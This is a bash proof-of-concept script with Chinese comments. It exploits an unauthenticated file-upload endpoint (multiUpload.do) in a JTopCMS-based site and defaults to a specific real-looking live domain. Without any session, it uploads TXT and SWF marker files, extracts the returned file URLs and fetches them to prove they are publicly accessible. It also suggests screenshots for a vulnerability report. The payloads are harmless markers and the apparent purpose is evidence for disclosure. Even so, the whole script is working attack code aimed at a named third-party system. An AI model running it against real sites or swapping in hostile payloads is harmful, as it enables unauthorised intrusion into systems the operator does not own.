#!/usr/bin/env bash
set -euo pipefail

BASE="${1:-https://www.taiyuanyouzhuan.com}"
OUT="${2:-/tmp/jtopcms_upload_evidence}"
TS="$(date +%Y%m%d_%H%M%S)"
MARK="POC_UNAUTH_UPLOAD_${TS}_NO_COOKIE_TOKEN"

mkdir -p "$OUT"
cd "$OUT"

printf '目标: %s\n证据目录: %s\nMarker: %s\n' "$BASE" "$OUT" "$MARK" | tee verify.log

printf '\n[1] 后台登录页验证：证明内容管理功能属于后台受控功能，应需要认证\n' | tee -a verify.log
curl -sk -D admin_login.headers "$BASE/core/SystemManager/login/page.thtml" -o admin_login.html || true
sed -n '1,20p' admin_login.headers | tee -a verify.log || true
grep -oi '<title[^>]*>[^<]*' admin_login.html | head -1 | tee -a verify.log || true

printf '\n[2] 公开JS验证：证明上传接口和文件类型规则暴露\n' | tee -a verify.log
curl -sk -D commonUtil.headers "$BASE/core/javascript/commonUtil.js" -o commonUtil.js || true
sed -n '1,15p' commonUtil.headers | tee -a verify.log || true
grep -nE 'multiUpload\.do|TEMPLATE_RULE|sysGetResInfo' commonUtil.js | head -20 | tee -a verify.log || true

printf '\n[3] 无Cookie/Token上传TXT：仅multipart/form-data\n' | tee -a verify.log
printf '%s\n' "$MARK TXT public readable proof" > poc_unauth_upload.txt
curl -sk -X POST "$BASE/content/multiUpload.do?type=file&classId=1" -F "file=@poc_unauth_upload.txt;filename=poc_unauth_upload_${TS}.txt" -D upload_txt.headers -o upload_txt.json
sed -n '1,30p' upload_txt.headers | tee -a verify.log
cat upload_txt.json | tee -a verify.log

extract_file_url() {
  local f="$1"
  python3 - "$f" <<'PY'
import json,re,sys
s=open(sys.argv[1],'rb').read().decode('utf-8','ignore')
try:
    j=json.loads(s); vals=[]
    def walk(x):
        if isinstance(x,dict):
            for k,v in x.items():
                if k=='fileUrl' and isinstance(v,str): vals.append(v)
                walk(v)
        elif isinstance(x,list):
            for v in x: walk(v)
    walk(j); print(vals[0] if vals else '')
except Exception:
    m=re.search(r'"fileUrl"\s*:\s*"([^"]+)"',s)
    print(m.group(1) if m else '')
PY
}

TXT_URL="$(extract_file_url upload_txt.json)"
if [ -z "$TXT_URL" ]; then
  echo '[!] 未能从TXT上传响应中提取fileUrl，请人工查看 upload_txt.json' | tee -a verify.log
else
  TXT_FULL="$BASE$TXT_URL"
  printf '\n[4] 访问TXT公网URL：证明上传文件被公网保存并可直接访问\n%s\n' "$TXT_FULL" | tee -a verify.log
  curl -sk -D get_txt.headers "$TXT_FULL" -o get_txt.body
  sed -n '1,30p' get_txt.headers | tee -a verify.log
  printf 'body_marker=' | tee -a verify.log
  grep -ao "$MARK" get_txt.body | head -1 | tee -a verify.log || true
fi

printf '\n[5] 无Cookie/Token上传SWF后缀文件：补强高风险MIME危害；内容为无害marker\n' | tee -a verify.log
printf '%s\n' "$MARK SWF harmless marker" > poc_unauth_upload.swf
curl -sk -X POST "$BASE/content/multiUpload.do?type=file&classId=1" -F "file=@poc_unauth_upload.swf;filename=poc_unauth_upload_${TS}.swf" -D upload_swf.headers -o upload_swf.json
sed -n '1,30p' upload_swf.headers | tee -a verify.log
cat upload_swf.json | tee -a verify.log

SWF_URL="$(extract_file_url upload_swf.json)"
if [ -z "$SWF_URL" ]; then
  echo '[!] 未能从SWF上传响应中提取fileUrl，请人工查看 upload_swf.json' | tee -a verify.log
else
  SWF_FULL="$BASE$SWF_URL"
  printf '\n[6] 访问SWF公网URL：证明高风险扩展名文件公网可访问，并记录Content-Type\n%s\n' "$SWF_FULL" | tee -a verify.log
  curl -sk -D get_swf.headers "$SWF_FULL" -o get_swf.body
  sed -n '1,35p' get_swf.headers | tee -a verify.log
  printf 'body_marker=' | tee -a verify.log
  grep -ao "$MARK" get_swf.body | head -1 | tee -a verify.log || true
fi

printf '\n[7] 证据文件清单\n' | tee -a verify.log
find "$OUT" -maxdepth 1 -type f -printf '%f\n' | sort | tee -a verify.log

printf '\n截图建议：\n' | tee -a verify.log
printf '截图1: admin_login.headers + title，证明后台登录存在。\n截图2: commonUtil.js 中 multiUpload.do/TEMPLATE_RULE。\n截图3: upload_txt.headers/upload_txt.json，证明无Cookie上传成功返回fileUrl/resId。\n截图4: get_txt.headers + body_marker，证明公网可直接访问上传内容。\n截图5: upload_swf.json + get_swf.headers，证明SWF等高风险后缀可上传且公网访问。\n' | tee -a verify.log
